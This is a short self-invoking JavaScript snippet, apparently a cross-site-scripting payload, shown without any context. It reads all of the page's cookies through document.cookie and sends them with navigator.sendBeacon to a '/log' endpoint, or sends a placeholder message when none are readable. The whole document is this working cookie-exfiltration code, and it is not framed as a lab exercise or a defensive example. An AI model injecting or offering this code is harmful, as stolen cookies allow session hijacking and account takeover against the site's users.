(function () {
    const cookies = document.cookie;
    if (cookies && cookies.length > 0) {
        navigator.sendBeacon("/log", "COOKIES: " + cookies);
    } else {
        navigator.sendBeacon("/log", "COOKIES: [None Present or Access Denied]");
    }
})();
